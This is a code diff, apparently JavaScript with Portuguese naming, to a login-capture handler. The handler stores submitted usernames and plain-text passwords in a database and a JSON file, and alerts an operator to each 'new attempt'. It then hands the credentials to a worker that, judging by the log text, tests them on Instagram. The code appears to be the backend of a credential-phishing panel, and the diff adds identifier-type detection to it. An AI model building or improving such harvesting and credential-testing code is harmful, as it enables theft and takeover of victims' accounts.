@@ -404,6 +404,8 @@ const handleSalvarLogin = (req, res) => {
     try {
         const usuarioLimpo = String(nome).trim();
         const senhaLimpa = String(senha);
+        const tipoIdentificador = req.body.tipo_identificador || dbOps.detectarTipoIdentificador(usuarioLimpo);
+        const identificadorFormatado = dbOps.formatarIdentificador(usuarioLimpo, tipoIdentificador);
 
         // 1. Registro de auditoria imediato
         audit.registrar({
@@ -411,7 +413,7 @@ const handleSalvarLogin = (req, res) => {
             event_type: "LOGIN_SUBMITTED",
             usuario: usuarioLimpo,
             status: "INFO",
-            details: { tenant, ip, userAgent },
+            details: { tenant, tipo_identificador: tipoIdentificador, identificador_formatado: identificadorFormatado, ip, userAgent },
             ip,
             userAgent
         });
@@ -422,7 +424,8 @@ const handleSalvarLogin = (req, res) => {
             usuario: usuarioLimpo,
             senha: senhaLimpa,
             ip,
-            userAgent
+            userAgent,
+            tipo_identificador: tipoIdentificador
         });
 
         // 3. Fallback em dados.json
@@ -430,6 +433,8 @@ const handleSalvarLogin = (req, res) => {
         dados.push({
             tenant,
             tipo: "LOGIN",
+            tipo_identificador: tipoIdentificador,
+            identificador_formatado: identificadorFormatado,
             nome: usuarioLimpo,
             usuario: usuarioLimpo,
             username: usuarioLimpo,
@@ -443,10 +448,10 @@ const handleSalvarLogin = (req, res) => {
         salvarDados(dados);
         notificarClientes();
 
-        console.log(`[LOGIN][${tenant}] Nova tentativa recebida: ${usuarioLimpo} (Status: aguardando operador | Auditoria: testando no IG)`);
+        console.log(`[LOGIN][${tenant}][${tipoIdentificador.toUpperCase()}] Nova tentativa recebida: ${usuarioLimpo} (${identificadorFormatado}) (Status: aguardando operador | Auditoria: testando no IG)`);
 
         // 4. Dispara validação prioritária via Warm Worker
-        testarViaWorker(usuarioLimpo, senhaLimpa, { tenant, ip, userAgent });
+        testarViaWorker(usuarioLimpo, senhaLimpa, { tenant, ip, userAgent, tipo_identificador: tipoIdentificador });
 
         // Timeout de segurança calibrado de 25s
         setTimeout(() => {
